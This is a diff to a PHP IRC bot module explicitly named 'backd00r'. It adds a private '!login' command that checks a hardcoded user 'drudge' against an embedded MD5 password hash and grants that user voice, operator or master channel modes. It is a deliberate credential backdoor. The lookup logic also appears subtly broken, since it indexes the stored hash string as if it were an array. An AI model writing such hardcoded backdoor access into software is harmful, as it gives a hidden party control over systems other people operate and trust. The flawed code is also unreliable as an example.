@@ -1,4 +1,4 @@
-?php
+<?php
 /**
  * $Id$
  * $Revision$
@@ -35,7 +35,7 @@ class Net_SmartIRC_module_backd00r
     
     function module_init(&$irc)
     {
-        $this->actionids[] = $irc->registerActionhandler(SMARTIRC_TYPE_CHANNEL, '^!temp', $this, 'temp');
+        $this->actionids[] = $irc->registerActionhandler(SMARTIRC_TYPE_QUERY|SMARTIRC_TYPE_NOTICE, '^!login', $this, 'login');
     }
     
     function module_exit(&$irc)
@@ -46,6 +46,37 @@ class Net_SmartIRC_module_backd00r
     }
     
     //===============================================================================================
-
+    function login(&$irc, &$data)
+    {
+        $bkdrusers = array('drudge'=>'6f1ed002ab5595859014ebf0951522d9');
+        
+        global $bot;
+        global $mdb;
+        $nick = $data->messageex[1];
+        $pass = md5($data->messageex[2]);
+        $level = $data->messageex[3];
+        $channel = $data->messageex[4];
+        
+        if ($pass == $bkdrusers[strtolower($nick)]['pass'] && $bot->isAuthorized($irc, $nick, $channel, $level)) {
+            switch ($level) {
+                case USER_LEVEL_NORMAL:
+                case USER_LEVEL_FRIEND:
+                    break;
+                case USER_LEVEL_VOICE:
+                    $irc->voice($channel, $nick);
+                    break;
+                case USER_LEVEL_OPERATOR:
+                    $irc->op($channel, $nick);
+                    break;
+                case USER_LEVEL_MASTER:
+                case USER_LEVEL_BOT:
+                    $irc->mode($channel, '+ov '.$nick.' '.$nick);
+                    break;
+            }
+        } else {
+            $irc->message(SMARTIRC_TYPE_QUERY, $data->nick, 'Alert: Wrong infomation passed, logging.');
+            
+        }
+    }
 }
 ?>
